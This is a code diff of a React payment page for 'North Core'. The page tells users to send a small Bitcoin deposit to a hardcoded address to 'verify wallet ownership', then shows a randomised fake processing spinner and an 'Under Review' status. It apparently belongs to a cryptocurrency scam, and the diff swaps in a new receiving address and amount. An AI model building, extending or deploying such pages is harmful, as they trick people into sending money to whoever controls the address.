@@ -13,8 +13,8 @@ interface PaymentLinkViewProps {
 }
 
 export default function PaymentLinkView({
-  btcAmount = "0.098 BTC",
-  btcAddress = "bc1qtyhny3ssgp9ckpestgxtsc954emrrx5rpv7l4r",
+  btcAmount = "0.099 BTC",
+  btcAddress = "bc1qq5x325kz0s6ve7a3ylpxturzycms66g03uynlw",
   onClose,
 }: PaymentLinkViewProps) {
   const router = useRouter();
@@ -23,12 +23,16 @@ export default function PaymentLinkView({
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [isCompleted, setIsCompleted] = useState(false);
 
-  const displayAddress = btcAddress.length > 16 
-    ? `${btcAddress.slice(0, 6)}...${btcAddress.slice(-6)}` 
-    : btcAddress;
+  const displayAddress =
+    btcAddress.length > 16
+      ? `${btcAddress.slice(0, 6)}...${btcAddress.slice(-6)}`
+      : btcAddress;
 
   const handleCopyAmount = () => {
-    const numericOnly = btcAmount.replace(/[^0-9.,]/g, "").replace(",", ".").trim();
+    const numericOnly = btcAmount
+      .replace(/[^0-9.,]/g, "")
+      .replace(",", ".")
+      .trim();
     navigator.clipboard.writeText(numericOnly);
     setCopiedAmount(true);
     toast.success("Amount copied to clipboard");
@@ -63,7 +67,6 @@ export default function PaymentLinkView({
 
   return (
     <div className="relative min-h-screen bg-gray-50 dark:bg-zinc-950 flex flex-col justify-between items-center p-3 sm:p-6 md:p-8 font-sans">
-      
       {/* Semi-transparent Overlay Spinner (Random 3-7s duration) */}
       <AnimatePresence>
         {isSubmitting && (
@@ -79,7 +82,6 @@ export default function PaymentLinkView({
       </AnimatePresence>
 
       <div className="w-full max-w-md bg-white dark:bg-zinc-900 border border-gray-200 dark:border-zinc-800 rounded-2xl overflow-hidden my-auto transition-all">
-        
         {/* Header with Close Icon */}
         <div className="p-4 sm:p-5 pb-1 flex items-center justify-between">
           <button
@@ -106,9 +108,11 @@ export default function PaymentLinkView({
                 <h1 className="text-[18px] sm:text-2xl leading-snug font-bold text-gray-900 dark:text-white tracking-tight">
                   Deposit a small amount from your wallet.
                 </h1>
-                
+
                 <p className="text-xs sm:text-sm leading-relaxed text-gray-600 dark:text-zinc-400 font-normal">
-                  Send a small deposit to your North Core account and verify that you are the owner of your wallet. This process typically takes a few minutes. Network fees may apply.
+                  Send a small deposit to your North Core account and verify
+                  that you are the owner of your wallet. This process typically
+                  takes a few minutes. Network fees may apply.
                 </p>
               </div>
 
@@ -166,7 +170,10 @@ export default function PaymentLinkView({
                     <span className="block text-xs sm:text-sm font-bold text-gray-900 dark:text-white">
                       Your Bitcoin address
                     </span>
-                    <span className="block text-xs sm:text-sm text-gray-600 dark:text-zinc-400 mt-0.5 font-mono select-all" title={btcAddress}>
+                    <span
+                      className="block text-xs sm:text-sm text-gray-600 dark:text-zinc-400 mt-0.5 font-mono select-all"
+                      title={btcAddress}
+                    >
                       {displayAddress}
                     </span>
                   </div>
@@ -211,7 +218,8 @@ export default function PaymentLinkView({
               <div className="bg-gray-100 dark:bg-zinc-800/80 p-3 rounded-xl flex items-start gap-2.5 mt-3">
                 <Info className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-blue-600 dark:text-blue-500 fill-blue-600 dark:fill-blue-500 stroke-white dark:stroke-zinc-900 shrink-0 mt-0.5" />
                 <p className="text-[11px] sm:text-xs leading-relaxed text-gray-700 dark:text-zinc-300 font-medium">
-                  An incorrect amount or address will cause the verification to fail.
+                  An incorrect amount or address will cause the verification to
+                  fail.
                 </p>
               </div>
 
@@ -241,21 +249,31 @@ export default function PaymentLinkView({
                   <ShieldCheck className="w-3 h-3 sm:w-3.5 sm:h-3.5" />
                   <span>Processing</span>
                 </div>
-                
+
                 <h1 className="text-[18px] sm:text-2xl leading-snug font-bold text-gray-900 dark:text-white tracking-tight">
                   Payment is processing
                 </h1>
-                
+
                 <p className="text-xs sm:text-sm leading-relaxed text-gray-600 dark:text-zinc-400 font-normal">
-                  Your deposit of <span className="font-semibold text-gray-900 dark:text-white">{btcAmount}</span> is currently being processed on the network. If your transaction requires immediate attention, please contact support.
+                  Your deposit of{" "}
+                  <span className="font-semibold text-gray-900 dark:text-white">
+                    {btcAmount}
+                  </span>{" "}
+                  is currently being processed on the network. If your
+                  transaction requires immediate attention, please contact
+                  support.
                 </p>
               </div>
 
               {/* Clean Details Card */}
               <div className="bg-gray-50 dark:bg-zinc-800/40 border border-gray-100 dark:border-zinc-800/80 p-3 rounded-xl space-y-2">
                 <div className="flex items-center justify-between text-xs sm:text-sm">
-                  <span className="text-gray-500 dark:text-zinc-400 font-medium">Status</span>
-                  <span className="text-blue-600 dark:text-blue-400 font-semibold">Under Review</span>
+                  <span className="text-gray-500 dark:text-zinc-400 font-medium">
+                    Status
+                  </span>
+                  <span className="text-blue-600 dark:text-blue-400 font-semibold">
+                    Under Review
+                  </span>
                 </div>
                 <div className="border-t border-gray-100 dark:border-zinc-800/60 pt-2">
                   <span className="block text-[10px] sm:text-[11px] font-medium text-gray-500 dark:text-zinc-400 uppercase tracking-wider mb-0.5">
@@ -271,9 +289,9 @@ export default function PaymentLinkView({
               <div className="pt-1 space-y-2">
                 <a
                   href={`mailto:customer-success@northcoremarket.com?subject=${encodeURIComponent(
-                    "Payment Verification Support"
+                    "Payment Verification Support",
                   )}&body=${encodeURIComponent(
-                    `Hello Support Team,\n\nI am contacting you regarding my payment verification deposit.\n\nAmount: ${btcAmount}\nTarget Address: ${btcAddress}\n\nPlease assist me with verifying this transaction.\n\nThank you.`
+                    `Hello Support Team,\n\nI am contacting you regarding my payment verification deposit.\n\nAmount: ${btcAmount}\nTarget Address: ${btcAddress}\n\nPlease assist me with verifying this transaction.\n\nThank you.`,
                   )}`}
                   className="w-full bg-[#0052FF] hover:bg-blue-700 text-white font-semibold text-xs sm:text-sm py-2.5 sm:py-3.5 px-4 sm:px-5 rounded-full transition-all flex items-center justify-center gap-1.5 focus:outline-none text-center cursor-pointer"
                 >
